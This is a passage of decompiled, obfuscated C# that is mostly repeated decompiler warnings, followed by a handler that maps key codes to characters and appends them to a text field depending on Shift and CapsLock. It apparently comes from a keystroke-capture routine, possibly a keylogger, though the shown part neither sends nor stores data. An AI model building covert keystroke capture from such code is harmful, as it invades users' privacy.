		//IL_1d6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d6e: Invalid comparison between Unknown and I4
		//IL_1d95: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d98: Invalid comparison between Unknown and I4
		//IL_1dbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc2: Invalid comparison between Unknown and I4
		//IL_1de9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dec: Invalid comparison between Unknown and I4
		//IL_1e13: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e16: Invalid comparison between Unknown and I4
		//IL_1e3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e40: Invalid comparison between Unknown and I4
		//IL_1e67: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e6a: Invalid comparison between Unknown and I4
		//IL_1e91: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e94: Invalid comparison between Unknown and I4
		//IL_1ebb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ebe: Invalid comparison between Unknown and I4
		//IL_1ee5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ee8: Invalid comparison between Unknown and I4
		//IL_1f0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f12: Invalid comparison between Unknown and I4
		//IL_1f39: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f3c: Invalid comparison between Unknown and I4
		//IL_1f63: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f66: Invalid comparison between Unknown and I4
		//IL_1f8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f90: Invalid comparison between Unknown and I4
		//IL_1fb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fba: Invalid comparison between Unknown and I4
		//IL_1fe1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fe4: Invalid comparison between Unknown and I4
		//IL_200b: Unknown result type (might be due to invalid IL or missing references)
		//IL_200e: Invalid comparison between Unknown and I4
		//IL_2035: Unknown result type (might be due to invalid IL or missing references)
		//IL_2038: Invalid comparison between Unknown and I4
		//IL_205f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2062: Invalid comparison between Unknown and I4
		//IL_2089: Unknown result type (might be due to invalid IL or missing references)
		//IL_208c: Invalid comparison between Unknown and I4
		//IL_20b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_20b6: Invalid comparison between Unknown and I4
		//IL_20dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_20e0: Invalid comparison between Unknown and I4
		//IL_2107: Unknown result type (might be due to invalid IL or missing references)
		//IL_210a: Invalid comparison between Unknown and I4
		//IL_2131: Unknown result type (might be due to invalid IL or missing references)
		//IL_2134: Invalid comparison between Unknown and I4
		//IL_215b: Unknown result type (might be due to invalid IL or missing references)
		//IL_215e: Invalid comparison between Unknown and I4
		//IL_2185: Unknown result type (might be due to invalid IL or missing references)
		//IL_2188: Invalid comparison between Unknown and I4
		//IL_21af: Unknown result type (might be due to invalid IL or missing references)
		//IL_21b2: Invalid comparison between Unknown and I4
		//IL_21d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_21dc: Invalid comparison between Unknown and I4
		//IL_2203: Unknown result type (might be due to invalid IL or missing references)
		//IL_2206: Invalid comparison between Unknown and I4
		//IL_222d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2233: Invalid comparison between Unknown and I4
		//IL_225a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2260: Invalid comparison between Unknown and I4
		//IL_2287: Unknown result type (might be due to invalid IL or missing references)
		//IL_228d: Invalid comparison between Unknown and I4
		//IL_22b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_22ba: Invalid comparison between Unknown and I4
		//IL_22e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_22e7: Invalid comparison between Unknown and I4
		//IL_230e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2314: Invalid comparison between Unknown and I4
		//IL_233b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2341: Invalid comparison between Unknown and I4
		//IL_2368: Unknown result type (might be due to invalid IL or missing references)
		//IL_236e: Invalid comparison between Unknown and I4
		//IL_2395: Unknown result type (might be due to invalid IL or missing references)
		//IL_239b: Invalid comparison between Unknown and I4
		//IL_23c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_23c5: Invalid comparison between Unknown and I4
		//IL_23ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_23ef: Invalid comparison between Unknown and I4
		//IL_2416: Unknown result type (might be due to invalid IL or missing references)
		//IL_2419: Invalid comparison between Unknown and I4
		//IL_2440: Unknown result type (might be due to invalid IL or missing references)
		//IL_2443: Invalid comparison between Unknown and I4
		//IL_246a: Unknown result type (might be due to invalid IL or missing references)
		//IL_246d: Invalid comparison between Unknown and I4
		//IL_2494: Unknown result type (might be due to invalid IL or missing references)
		//IL_2497: Invalid comparison between Unknown and I4
		//IL_24be: Unknown result type (might be due to invalid IL or missing references)
		//IL_24c1: Invalid comparison between Unknown and I4
		//IL_24e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_24eb: Invalid comparison between Unknown and I4
		//IL_2512: Unknown result type (might be due to invalid IL or missing references)
		//IL_2515: Invalid comparison between Unknown and I4
		//IL_253c: Unknown result type (might be due to invalid IL or missing references)
		//IL_253f: Invalid comparison between Unknown and I4
		//IL_2566: Unknown result type (might be due to invalid IL or missing references)
		//IL_2569: Invalid comparison between Unknown and I4
		//IL_2590: Unknown result type (might be due to invalid IL or missing references)
		//IL_2593: Invalid comparison between Unknown and I4
		//IL_25ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_25bd: Invalid comparison between Unknown and I4
		//IL_25e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_25e7: Invalid comparison between Unknown and I4
		//IL_260e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2611: Invalid comparison between Unknown and I4
		//IL_2638: Unknown result type (might be due to invalid IL or missing references)
		//IL_263a: Invalid comparison between Unknown and I4
		//IL_2661: Unknown result type (might be due to invalid IL or missing references)
		//IL_2664: Invalid comparison between Unknown and I4
		//IL_268b: Unknown result type (might be due to invalid IL or missing references)
		//IL_268e: Invalid comparison between Unknown and I4
		//IL_26b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_26b8: Invalid comparison between Unknown and I4
		//IL_26df: Unknown result type (might be due to invalid IL or missing references)
		//IL_26e2: Invalid comparison between Unknown and I4
		//IL_2709: Unknown result type (might be due to invalid IL or missing references)
		//IL_270c: Invalid comparison between Unknown and I4
		//IL_2733: Unknown result type (might be due to invalid IL or missing references)
		//IL_2736: Invalid comparison between Unknown and I4
		//IL_275d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2760: Invalid comparison between Unknown and I4
		//IL_2787: Unknown result type (might be due to invalid IL or missing references)
		//IL_278a: Invalid comparison between Unknown and I4
		//IL_27b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_27b4: Invalid comparison between Unknown and I4
		//IL_27db: Unknown result type (might be due to invalid IL or missing references)
		//IL_27de: Invalid comparison between Unknown and I4
		//IL_2805: Unknown result type (might be due to invalid IL or missing references)
		//IL_2808: Invalid comparison between Unknown and I4
		//IL_282f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2832: Invalid comparison between Unknown and I4
		//IL_2883: Unknown result type (might be due to invalid IL or missing references)
		//IL_2886: Invalid comparison between Unknown and I4
		//IL_28ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_28b0: Invalid comparison between Unknown and I4
		//IL_28d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_28da: Invalid comparison between Unknown and I4
		//IL_2901: Unknown result type (might be due to invalid IL or missing references)
		//IL_2904: Invalid comparison between Unknown and I4
		//IL_292b: Unknown result type (might be due to invalid IL or missing references)
		//IL_292e: Invalid comparison between Unknown and I4
		//IL_2955: Unknown result type (might be due to invalid IL or missing references)
		//IL_2958: Invalid comparison between Unknown and I4
		//IL_297f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2982: Invalid comparison between Unknown and I4
		//IL_29a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_29ac: Invalid comparison between Unknown and I4
		//IL_29d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_29d6: Invalid comparison between Unknown and I4
		//IL_29fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a00: Invalid comparison between Unknown and I4
		//IL_2a27: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a2a: Invalid comparison between Unknown and I4
		//IL_2a51: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a54: Invalid comparison between Unknown and I4
		//IL_2a7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a7e: Invalid comparison between Unknown and I4
		//IL_2aa5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aa8: Invalid comparison between Unknown and I4
		//IL_2acf: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ad2: Invalid comparison between Unknown and I4
		//IL_2af9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2afc: Invalid comparison between Unknown and I4
		//IL_2b23: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b26: Invalid comparison between Unknown and I4
		//IL_2b4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b50: Invalid comparison between Unknown and I4
		//IL_2b77: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b7a: Invalid comparison between Unknown and I4
		//IL_2ba1: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ba4: Invalid comparison between Unknown and I4
		//IL_2bcb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bce: Invalid comparison between Unknown and I4
		//IL_2bf5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bf8: Invalid comparison between Unknown and I4
		//IL_2c1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c22: Invalid comparison between Unknown and I4
		//IL_2c49: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c4c: Invalid comparison between Unknown and I4
		//IL_2c73: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c76: Invalid comparison between Unknown and I4
		//IL_2c9d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ca0: Invalid comparison between Unknown and I4
		//IL_2cc7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cca: Invalid comparison between Unknown and I4
		//IL_2cf1: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cf4: Invalid comparison between Unknown and I4
		//IL_2d1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d1e: Invalid comparison between Unknown and I4
		//IL_2d45: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d48: Invalid comparison between Unknown and I4
		//IL_2d6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d72: Invalid comparison between Unknown and I4
		//IL_2d99: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d9c: Invalid comparison between Unknown and I4
		//IL_2dc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dc6: Invalid comparison between Unknown and I4
		//IL_2ded: Unknown result type (might be due to invalid IL or missing references)
		//IL_2df0: Invalid comparison between Unknown and I4
		//IL_2e17: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e1a: Invalid comparison between Unknown and I4
		//IL_2e41: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e44: Invalid comparison between Unknown and I4
		//IL_2e6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e71: Invalid comparison between Unknown and I4
		//IL_2e98: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e9e: Invalid comparison between Unknown and I4
		//IL_2ec5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ecb: Invalid comparison between Unknown and I4
		//IL_2ef2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ef8: Invalid comparison between Unknown and I4
		//IL_2f1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f25: Invalid comparison between Unknown and I4
		//IL_2f4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f52: Invalid comparison between Unknown and I4
		//IL_2f79: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f7f: Invalid comparison between Unknown and I4
		//IL_2fa6: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fac: Invalid comparison between Unknown and I4
		//IL_2fd3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fd9: Invalid comparison between Unknown and I4
		//IL_3000: Unknown result type (might be due to invalid IL or missing references)
		//IL_3006: Invalid comparison between Unknown and I4
		//IL_302d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3030: Invalid comparison between Unknown and I4
		//IL_3057: Unknown result type (might be due to invalid IL or missing references)
		//IL_305a: Invalid comparison between Unknown and I4
		//IL_3081: Unknown result type (might be due to invalid IL or missing references)
		//IL_3084: Invalid comparison between Unknown and I4
		//IL_30ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_30ae: Invalid comparison between Unknown and I4
		//IL_30d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_30d8: Invalid comparison between Unknown and I4
		//IL_30ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_3102: Invalid comparison between Unknown and I4
		//IL_3129: Unknown result type (might be due to invalid IL or missing references)
		//IL_312c: Invalid comparison between Unknown and I4
		//IL_3153: Unknown result type (might be due to invalid IL or missing references)
		//IL_3156: Invalid comparison between Unknown and I4
		//IL_317d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3180: Invalid comparison between Unknown and I4
		//IL_31a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_31aa: Invalid comparison between Unknown and I4
		//IL_31d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_31d4: Invalid comparison between Unknown and I4
		//IL_31fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_31fe: Invalid comparison between Unknown and I4
		//IL_3225: Unknown result type (might be due to invalid IL or missing references)
		//IL_3228: Invalid comparison between Unknown and I4
		//IL_324f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3252: Invalid comparison between Unknown and I4
		//IL_3279: Unknown result type (might be due to invalid IL or missing references)
		//IL_327c: Invalid comparison between Unknown and I4
		//IL_32a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_32a5: Invalid comparison between Unknown and I4
		//IL_32cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_32cf: Invalid comparison between Unknown and I4
		//IL_32f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_32f9: Invalid comparison between Unknown and I4
		//IL_3320: Unknown result type (might be due to invalid IL or missing references)
		//IL_3323: Invalid comparison between Unknown and I4
		//IL_334a: Unknown result type (might be due to invalid IL or missing references)
		//IL_334d: Invalid comparison between Unknown and I4
		//IL_3374: Unknown result type (might be due to invalid IL or missing references)
		//IL_3377: Invalid comparison between Unknown and I4
		//IL_339e: Unknown result type (might be due to invalid IL or missing references)
		//IL_33a1: Invalid comparison between Unknown and I4
		//IL_33c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_33cb: Invalid comparison between Unknown and I4
		//IL_33f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_33f5: Invalid comparison between Unknown and I4
		//IL_341c: Unknown result type (might be due to invalid IL or missing references)
		//IL_341f: Invalid comparison between Unknown and I4
		//IL_3446: Unknown result type (might be due to invalid IL or missing references)
		//IL_3449: Invalid comparison between Unknown and I4
		//IL_3470: Unknown result type (might be due to invalid IL or missing references)
		//IL_3473: Invalid comparison between Unknown and I4
		//IL_349a: Unknown result type (might be due to invalid IL or missing references)
		//IL_349d: Invalid comparison between Unknown and I4
		//IL_34ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_34f1: Invalid comparison between Unknown and I4
		//IL_3518: Unknown result type (might be due to invalid IL or missing references)
		//IL_351b: Invalid comparison between Unknown and I4
		//IL_3542: Unknown result type (might be due to invalid IL or missing references)
		//IL_3545: Invalid comparison between Unknown and I4
		//IL_356c: Unknown result type (might be due to invalid IL or missing references)
		//IL_356f: Invalid comparison between Unknown and I4
		//IL_3596: Unknown result type (might be due to invalid IL or missing references)
		//IL_3599: Invalid comparison between Unknown and I4
		//IL_35c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_35c3: Invalid comparison between Unknown and I4
		//IL_35ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_35ed: Invalid comparison between Unknown and I4
		//IL_3614: Unknown result type (might be due to invalid IL or missing references)
		//IL_3617: Invalid comparison between Unknown and I4
		//IL_363e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3641: Invalid comparison between Unknown and I4
		//IL_3668: Unknown result type (might be due to invalid IL or missing references)
		//IL_366b: Invalid comparison between Unknown and I4
		//IL_3692: Unknown result type (might be due to invalid IL or missing references)
		//IL_3695: Invalid comparison between Unknown and I4
		//IL_36bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_36bf: Invalid comparison between Unknown and I4
		//IL_36e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_36e9: Invalid comparison between Unknown and I4
		//IL_3710: Unknown result type (might be due to invalid IL or missing references)
		//IL_3713: Invalid comparison between Unknown and I4
		//IL_373a: Unknown result type (might be due to invalid IL or missing references)
		//IL_373d: Invalid comparison between Unknown and I4
		//IL_3764: Unknown result type (might be due to invalid IL or missing references)
		//IL_3767: Invalid comparison between Unknown and I4
		//IL_378e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3791: Invalid comparison between Unknown and I4
		//IL_37b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_37bb: Invalid comparison between Unknown and I4
		//IL_37e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_37e5: Invalid comparison between Unknown and I4
		//IL_380c: Unknown result type (might be due to invalid IL or missing references)
		//IL_380f: Invalid comparison between Unknown and I4
		//IL_3836: Unknown result type (might be due to invalid IL or missing references)
		//IL_3839: Invalid comparison between Unknown and I4
		//IL_3860: Unknown result type (might be due to invalid IL or missing references)
		//IL_3863: Invalid comparison between Unknown and I4
		//IL_388a: Unknown result type (might be due to invalid IL or missing references)
		//IL_388d: Invalid comparison between Unknown and I4
		//IL_38b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_38b7: Invalid comparison between Unknown and I4
		//IL_38de: Unknown result type (might be due to invalid IL or missing references)
		//IL_38e1: Invalid comparison between Unknown and I4
		//IL_3908: Unknown result type (might be due to invalid IL or missing references)
		//IL_390b: Invalid comparison between Unknown and I4
		//IL_3932: Unknown result type (might be due to invalid IL or missing references)
		//IL_3935: Invalid comparison between Unknown and I4
		//IL_395c: Unknown result type (might be due to invalid IL or missing references)
		//IL_395f: Invalid comparison between Unknown and I4
		//IL_3986: Unknown result type (might be due to invalid IL or missing references)
		//IL_3989: Invalid comparison between Unknown and I4
		//IL_39b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_39b3: Invalid comparison between Unknown and I4
		//IL_39da: Unknown result type (might be due to invalid IL or missing references)
		//IL_39dd: Invalid comparison between Unknown and I4
		//IL_3a04: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a07: Invalid comparison between Unknown and I4
		//IL_3a2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a31: Invalid comparison between Unknown and I4
		//IL_3a58: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a5b: Invalid comparison between Unknown and I4
		//IL_3a82: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a85: Invalid comparison between Unknown and I4
		//IL_3aac: Unknown result type (might be due to invalid IL or missing references)
		//IL_3aaf: Invalid comparison between Unknown and I4
		//IL_3ad6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ad9: Invalid comparison between Unknown and I4
		//IL_3b00: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b06: Invalid comparison between Unknown and I4
		//IL_3b2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b33: Invalid comparison between Unknown and I4
		//IL_3b5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b60: Invalid comparison between Unknown and I4
		//IL_3b87: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b8d: Invalid comparison between Unknown and I4
		//IL_3bb4: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bba: Invalid comparison between Unknown and I4
		//IL_3be1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3be7: Invalid comparison between Unknown and I4
		//IL_3c0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c14: Invalid comparison between Unknown and I4
		//IL_3c3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c41: Invalid comparison between Unknown and I4
		//IL_3c68: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c6e: Invalid comparison between Unknown and I4
		//IL_3c95: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c98: Invalid comparison between Unknown and I4
		//IL_3cbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cc2: Invalid comparison between Unknown and I4
		//IL_3ce9: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cec: Invalid comparison between Unknown and I4
		//IL_3d13: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d16: Invalid comparison between Unknown and I4
		//IL_3d3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d40: Invalid comparison between Unknown and I4
		//IL_3d67: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d6a: Invalid comparison between Unknown and I4
		//IL_3d91: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d94: Invalid comparison between Unknown and I4
		//IL_3dbb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dbe: Invalid comparison between Unknown and I4
		//IL_3de5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3de8: Invalid comparison between Unknown and I4
		//IL_3e0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e12: Invalid comparison between Unknown and I4
		//IL_3e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e3c: Invalid comparison between Unknown and I4
		//IL_3e63: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e66: Invalid comparison between Unknown and I4
		//IL_3e8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e90: Invalid comparison between Unknown and I4
		//IL_3eb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3eba: Invalid comparison between Unknown and I4
		//IL_3ee1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ee4: Invalid comparison between Unknown and I4
		//IL_3f0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f0d: Invalid comparison between Unknown and I4
		//IL_3f34: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f37: Invalid comparison between Unknown and I4
		//IL_3f5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f61: Invalid comparison between Unknown and I4
		//IL_3f88: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f8b: Invalid comparison between Unknown and I4
		//IL_3fb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fb5: Invalid comparison between Unknown and I4
		//IL_3fdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fdf: Invalid comparison between Unknown and I4
		//IL_4006: Unknown result type (might be due to invalid IL or missing references)
		//IL_4009: Invalid comparison between Unknown and I4
		//IL_4030: Unknown result type (might be due to invalid IL or missing references)
		//IL_4033: Invalid comparison between Unknown and I4
		//IL_405a: Unknown result type (might be due to invalid IL or missing references)
		//IL_405d: Invalid comparison between Unknown and I4
		//IL_4084: Unknown result type (might be due to invalid IL or missing references)
		//IL_4087: Invalid comparison between Unknown and I4
		//IL_40ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_40ae: Invalid comparison between Unknown and I4
		//IL_40d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_40d5: Invalid comparison between Unknown and I4
		//IL_40f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_40fc: Invalid comparison between Unknown and I4
		if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & !((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 65)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "a");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "b");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "c");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "d");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "e");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "f");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "g");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "h");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "i");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "j");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "k");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "l");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "m");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "n");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "o");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "p");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "r");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "s");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "t");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "u");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "v");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "w");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "x");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "z");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "0");
			}
			else if ((int)keys_0 == 49)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "1");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "2");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "3");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "4");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "5");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "6");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "7");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "8");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "9");
			}
			else if ((int)keys_0 == 96)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "0");
			}
			else if ((int)keys_0 == 97)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "1");
			}
			else if ((int)keys_0 == 98)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "2");
			}
			else if ((int)keys_0 == 99)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "3");
			}
			else if ((int)keys_0 == 100)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "4");
			}
			else if ((int)keys_0 == 101)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "5");
			}
			else if ((int)keys_0 == 102)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "6");
			}
			else if ((int)keys_0 == 103)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "7");
			}
			else if ((int)keys_0 == 104)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "8");
			}
			else if ((int)keys_0 == 105)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "9");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ",");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "'");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "]");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\\");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ";");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "`");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + " ");
